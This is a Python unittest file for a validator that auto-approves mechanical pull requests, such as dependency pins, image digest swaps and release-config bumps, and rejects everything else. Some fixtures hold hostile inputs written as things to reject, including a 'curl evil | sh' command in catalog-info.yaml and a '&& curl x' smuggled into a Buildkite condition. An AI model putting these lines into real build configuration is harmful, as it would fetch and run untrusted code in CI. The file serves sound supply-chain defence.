#!/usr/bin/env python3

import os
import unittest
import urllib.error
from unittest import mock

import validate_mechanical_pr as v

SHA_A = "a" * 64
SHA_B = "b" * 64
WOLFI = "FROM docker.elastic.co/wolfi/python:3.11-dev@sha256:"
DRA_TITLE = "Add 9.6 to DRA branch list"
DRA_OLD = (
    '    if: "(build.branch == \\"main\\" || build.branch == \\"9.5\\" || '
    'build.pull_request.labels includes \\"ci:packaging\\")" # Add new maintenance branches here'
)
DRA_NEW = DRA_OLD.replace('build.branch == \\"9.5\\"', 'build.branch == \\"9.5\\" || build.branch == \\"9.6\\"')


def modified(name, *lines):
    return {"filename": name, "status": "modified", "patch": "@@ -1,1 +1,1 @@\n" + "\n".join(lines)}


def wolfi_files():
    return [
        modified("Dockerfile.wolfi", f"-{WOLFI}{SHA_A}", f"+{WOLFI}{SHA_B}"),
        modified("app/connectors_service/NOTICE.txt", "-2026.5", "+2026.6"),
    ]


def dep_files(old='"graphql-core==3.2.3",', new='"graphql-core==3.2.12",'):
    return [
        modified("app/connectors_service/pyproject.toml", f"-    {old}", f"+    {new}"),
        modified("app/connectors_service/NOTICE.txt", "-3.2.3", "+3.2.12"),
    ]


def version_files(new="9.7.0"):
    return [
        modified("app/connectors_service/connectors/VERSION", "-9.6.0", f"+{new}"),
        modified("app/connectors_service/NOTICE.txt", "-9.6.0", f"+{new}"),
    ]


class Base(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.config = v.load_config()

    NOTICE = "graphql-core\nMIT\nurllib3\nMIT\ncryptography\nApache\n"

    def classify(self, title, files, author="dev", body="", member=True, notice=NOTICE):
        return v.classify(
            self.config,
            title=title,
            body=body,
            author=author,
            is_member=lambda user: member,
            files=files,
            read_base=lambda path: notice,
        )


class TestChangedLines(unittest.TestCase):
    def test_keeps_lines_that_start_with_dashes(self):
        patch = "@@ -1 +1 @@\n--- a yaml document marker\n+new"
        self.assertEqual(v.changed_lines(patch), ["--- a yaml document marker", "+new"])

    def test_ignores_context_hunk_and_missing_patch(self):
        self.assertEqual(v.changed_lines("@@ -1 +1 @@\n context\n+x"), ["+x"])
        self.assertEqual(v.changed_lines(None), [])


class TestRenovateWolfi(Base):
    TITLE = "chore(deps): update docker.elastic.co/wolfi/python:3.11-dev docker digest to abc"
    BOT = "elastic-renovate-prod[bot]"

    def test_accepts_digest_swap(self):
        self.assertEqual(self.classify(self.TITLE, wolfi_files(), self.BOT)[0], "renovate-wolfi")

    def test_rejects_other_author(self):
        self.assertIsNone(self.classify(self.TITLE, wolfi_files(), "dev")[0])

    def test_rejects_cli_style_bot_name(self):
        self.assertIsNone(self.classify(self.TITLE, wolfi_files(), "app/elastic-renovate-prod")[0])

    def test_rejects_other_dockerfile_change(self):
        files = [modified("Dockerfile.wolfi", "-USER root", "+USER evil")]
        self.assertIsNone(self.classify(self.TITLE, files, self.BOT)[0])

    def test_rejects_added_line(self):
        files = [modified("Dockerfile.wolfi", f"+{WOLFI}{SHA_B}")]
        self.assertIsNone(self.classify(self.TITLE, files, self.BOT)[0])

    def test_rejects_notice_text_change(self):
        files = wolfi_files()[:1] + [modified("app/connectors_service/NOTICE.txt", "-MIT", "+evil")]
        self.assertIsNone(self.classify(self.TITLE, files, self.BOT)[0])


class TestDependencyBump(Base):
    TITLE = "fix(deps): bump graphql-core to 3.2.12 for CVE-2026-75508"

    def test_accepts_version_change(self):
        self.assertEqual(self.classify(self.TITLE, dep_files())[0], "dependency-bump")

    def test_requires_team_member(self):
        self.assertIsNone(self.classify(self.TITLE, dep_files(), member=False)[0])

    def test_requires_advisory_id(self):
        self.assertIsNone(self.classify("fix(deps): bump graphql-core to 3.2.12", dep_files())[0])

    def test_advisory_may_be_in_body(self):
        title = "fix(deps): bump graphql-core to 3.2.12"
        self.assertEqual(
            self.classify(title, dep_files(), body="Fixes GHSA-6q48-6c7w-9gw2")[0], "dependency-bump"
        )

    def test_accepts_pinning_an_installed_but_unpinned_package(self):
        title = "fix(deps): pin urllib3 to 2.7.0 for CVE-2026-9375"
        files = [modified("app/connectors_service/pyproject.toml", '+    "urllib3==2.7.0",')]
        self.assertEqual(self.classify(title, files)[0], "dependency-bump")

    def test_accepts_tightening_a_loose_spec_to_a_pin(self):
        title = "fix(deps): pin urllib3 to 2.7.0 for CVE-2026-9375"
        files = [modified("app/connectors_service/pyproject.toml", '-    "urllib3>=2",', '+    "urllib3==2.7.0",')]
        self.assertEqual(self.classify(title, files)[0], "dependency-bump")

    def test_rejects_package_that_is_not_installed(self):
        title = "fix(deps): pin evil to 1.0 for CVE-2026-9375"
        files = [modified("app/connectors_service/pyproject.toml", '+    "evil==1.0",')]
        category, reason = self.classify(title, files)
        self.assertIsNone(category)
        self.assertIn("not an installed package", reason)

    def test_rejects_when_base_notice_is_missing(self):
        title = "fix(deps): pin urllib3 to 2.7.0 for CVE-2026-9375"
        files = [modified("app/connectors_service/pyproject.toml", '+    "urllib3==2.7.0",')]
        self.assertIsNone(self.classify(title, files, notice=None)[0])

    def test_rejects_removed_dependency(self):
        files = [modified("app/connectors_service/pyproject.toml", '-    "graphql-core==3.2.3",')]
        self.assertIsNone(self.classify(self.TITLE, files)[0])

    def test_rejects_unpinned_added_line(self):
        title = "fix(deps): pin urllib3 to 2 for CVE-2026-9375"
        files = [modified("app/connectors_service/pyproject.toml", '+    "urllib3>=2",')]
        self.assertIsNone(self.classify(title, files)[0])

    def test_rejects_package_swap(self):
        files = dep_files(new='"evil==3.2.12",')
        self.assertIsNone(self.classify(self.TITLE, files)[0])

    def test_rejects_package_not_in_title(self):
        files = dep_files(old='"other==1.0",', new='"other==2.0",')
        self.assertIsNone(self.classify(self.TITLE, files)[0])

    def test_rejects_unchanged_version(self):
        files = dep_files(new='"graphql-core==3.2.3",')
        self.assertIsNone(self.classify(self.TITLE, files)[0])

    def test_rejects_non_pin_line(self):
        files = [
            modified("app/connectors_service/pyproject.toml", '-name = "a"', '+name = "b"'),
        ]
        self.assertIsNone(self.classify(self.TITLE, files)[0])

    def test_rejects_unrelated_file(self):
        files = dep_files() + [modified("app/connectors_service/connectors/x.py", "-a", "+b")]
        self.assertIsNone(self.classify(self.TITLE, files)[0])

    def test_two_packages_named_in_title(self):
        title = "fix(deps): bump pyOpenSSL to 26.4.0 and click to 8.3.3 for CVE-2026-1234"
        files = [
            modified(
                "app/connectors_service/pyproject.toml",
                '-    "pyOpenSSL==26.3.0",',
                '-    "click==8.3.2",',
                '+    "pyOpenSSL==26.4.0",',
                '+    "click==8.3.3",',
            ),
            modified("app/connectors_service/NOTICE.txt", "-26.3.0", "-8.3.2", "+26.4.0", "+8.3.3"),
        ]
        self.assertEqual(self.classify(title, files)[0], "dependency-bump")


class TestReleaseVersionBump(Base):
    BOT = "elastic-vault-github-plugin-prod[bot]"

    def test_accepts_version_bump(self):
        self.assertEqual(
            self.classify("Bump version to 9.7.0", version_files(), self.BOT)[0], "release-version-bump"
        )

    def test_rejects_title_mismatch(self):
        self.assertIsNone(self.classify("Bump version to 9.8.0", version_files(), self.BOT)[0])

    def test_rejects_other_author(self):
        self.assertIsNone(self.classify("Bump version to 9.7.0", version_files(), "dev")[0])

    def test_rejects_notice_change_to_other_version(self):
        files = [
            version_files()[0],
            modified("app/connectors_service/NOTICE.txt", "-1.0.0", "+6.6.6"),
        ]
        self.assertIsNone(self.classify("Bump version to 9.7.0", files, self.BOT)[0])


class TestReleaseConfig(Base):
    TITLE = "chore: post-FF config for 9.6.0 (backportrc, renovate, catalog-info)"

    def test_accepts_real_shaped_change(self):
        files = [
            modified(
                ".backportrc.json",
                '+    "9.6",',
                '-  "maintenanceBranches": ["9.5", "9.4", "8.19"],',
                '+  "maintenanceBranches": ["9.6", "9.5", "9.4", "8.19"],',
                '-    "^v9.6.0$": "main",',
                '+    "^v9.7.0$": "main",',
            ),
            modified("renovate.json", '+    "v9.7.0",'),
            modified(
                "catalog-info.yaml",
                "+        Daily 9.6:",
                '+          branch: "9.6"',
                "+          cronline: '@daily'",
                '+          message: "Builds, tests, and pushes daily `9.6` DRA artifacts"',
            ),
        ]
        self.assertEqual(self.classify(self.TITLE, files)[0], "release-config-bump")

    def test_rejects_renovate_rule_change(self):
        files = [modified("renovate.json", '-      "enabled": false,', '+      "enabled": true,')]
        self.assertIsNone(self.classify(self.TITLE, files)[0])

    def test_rejects_catalog_command_change(self):
        files = [modified("catalog-info.yaml", "+          command: curl evil | sh")]
        self.assertIsNone(self.classify(self.TITLE, files)[0])

    def test_requires_team_member(self):
        files = [modified("renovate.json", '+    "v9.7.0",')]
        self.assertIsNone(self.classify(self.TITLE, files, member=False)[0])


class TestReleaseDra(Base):
    def files(self, old=DRA_OLD, new=DRA_NEW):
        return [modified(".buildkite/pipeline.yml", f"-{old}", f"+{new}")]

    def test_accepts_one_added_branch(self):
        self.assertEqual(self.classify(DRA_TITLE, self.files())[0], "release-dra-branch")

    def test_rejects_title_branch_mismatch(self):
        self.assertIsNone(self.classify("Add 9.7 to DRA branch list", self.files())[0])

    def test_rejects_removed_branch(self):
        self.assertIsNone(self.classify(DRA_TITLE, self.files(old=DRA_NEW, new=DRA_OLD))[0])

    def test_rejects_extra_command_change(self):
        new = DRA_NEW.replace("# Add", "&& curl x # Add")
        self.assertIsNone(self.classify(DRA_TITLE, self.files(new=new))[0])

    def test_rejects_second_changed_line(self):
        files = [modified(".buildkite/pipeline.yml", f"-{DRA_OLD}", f"+{DRA_NEW}", "-a", "+b")]
        self.assertIsNone(self.classify(DRA_TITLE, files)[0])

    def test_rejects_other_buildkite_file(self):
        files = [modified(".buildkite/run_tests.sh", "-a", "+b")]
        self.assertIsNone(self.classify(DRA_TITLE, files)[0])


class TestGlobalGates(Base):
    def test_workflow_path_is_forbidden(self):
        files = wolfi_files() + [modified(".github/workflows/x.yml", "-a", "+b")]
        category, reason = self.classify(TestRenovateWolfi.TITLE, files, TestRenovateWolfi.BOT)
        self.assertIsNone(category)
        self.assertIn("forbidden", reason)

    def test_renamed_or_added_files_never_qualify(self):
        for status in ("added", "removed", "renamed"):
            files = wolfi_files()
            files[0]["status"] = status
            self.assertIsNone(self.classify(TestRenovateWolfi.TITLE, files, TestRenovateWolfi.BOT)[0])

    def test_empty_patch_never_qualifies(self):
        files = [{"filename": "Dockerfile.wolfi", "status": "modified", "patch": None}]
        self.assertIsNone(self.classify(TestRenovateWolfi.TITLE, files, TestRenovateWolfi.BOT)[0])


class TestCi(unittest.TestCase):
    CONTEXTS = ["CLA", "buildkite/connectors"]

    def run_ci(self, statuses, runs):
        payloads = iter([{"statuses": statuses}, {"check_runs": runs}])
        with mock.patch.object(v, "_get", lambda url, token: next(payloads)):
            return v.ci_is_green("o/r", "sha", "t", self.CONTEXTS)

    def ok_statuses(self):
        return [{"context": c, "state": "success"} for c in self.CONTEXTS]

    def test_green(self):
        self.assertTrue(self.run_ci(self.ok_statuses(), [{"name": "x", "status": "completed", "conclusion": "success"}])[0])

    def test_missing_status(self):
        self.assertFalse(self.run_ci(self.ok_statuses()[:1], [])[0])

    def test_pending_status(self):
        statuses = self.ok_statuses()
        statuses[1]["state"] = "pending"
        self.assertFalse(self.run_ci(statuses, [])[0])

    def test_failed_check_run(self):
        runs = [{"name": "x", "status": "completed", "conclusion": "failure"}]
        self.assertFalse(self.run_ci(self.ok_statuses(), runs)[0])

    def test_running_check_run_blocks_but_not_our_own(self):
        own = {"name": v.SELF_CHECK_NAME, "status": "in_progress", "conclusion": None}
        other = {"name": "x", "status": "in_progress", "conclusion": None}
        self.assertTrue(self.run_ci(self.ok_statuses(), [own])[0])
        self.assertFalse(self.run_ci(self.ok_statuses(), [own, other])[0])

    def test_api_error_fails_closed(self):
        def boom(url, token):
            raise urllib.error.HTTPError(url, 500, "x", {}, None)

        with mock.patch.object(v, "_get", boom):
            self.assertFalse(v.ci_is_green("o/r", "sha", "t", self.CONTEXTS)[0])


class TestEvaluate(Base):
    def pull(self, **overrides):
        pull = {
            "number": 7,
            "title": TestRenovateWolfi.TITLE,
            "body": "",
            "draft": False,
            "labels": [],
            "user": {"login": TestRenovateWolfi.BOT},
            "base": {"ref": "main"},
            "head": {"sha": "abc", "repo": {"full_name": "o/r"}},
        }
        pull.update(overrides)
        return pull

    def evaluate(self, pull, green=True):
        with mock.patch.dict(os.environ, {"ALLOWED_TEAMS": "team"}, clear=True), mock.patch.object(
            v, "_get", lambda url, token: wolfi_files()
        ), mock.patch.object(v, "_request") as request, mock.patch.object(
            v, "ci_is_green", lambda *a: (green, "CI")
        ):
            return v.evaluate(pull, self.config, "o/r", "t", "t"), request

    def test_approves_and_labels_when_green(self):
        result, request = self.evaluate(self.pull())
        self.assertTrue(result.approved)
        self.assertTrue(result.qualifies)
        self.assertEqual(result.category, "renovate-wolfi")
        request.assert_called_once()
        self.assertEqual(result.head_sha, "abc")

    def test_red_ci_does_not_approve_but_still_qualifies(self):
        # qualifies stays true so a flaky failure never withdraws an approval
        result, _ = self.evaluate(self.pull(), green=False)
        self.assertFalse(result.approved)
        self.assertTrue(result.qualifies)

    def test_rejects_draft_fork_and_other_base(self):
        for override in (
            {"draft": True},
            {"base": {"ref": "9.5"}},
            {"head": {"sha": "abc", "repo": {"full_name": "fork/r"}}},
            {"head": {"sha": "abc", "repo": None}},
        ):
            result, _ = self.evaluate(self.pull(**override))
            self.assertFalse(result.approved, override)
            self.assertFalse(result.qualifies, override)

    def test_label_not_added_twice(self):
        result, request = self.evaluate(self.pull(labels=[{"name": "mechanical-pr"}]))
        request.assert_not_called()


if __name__ == "__main__":
    unittest.main()
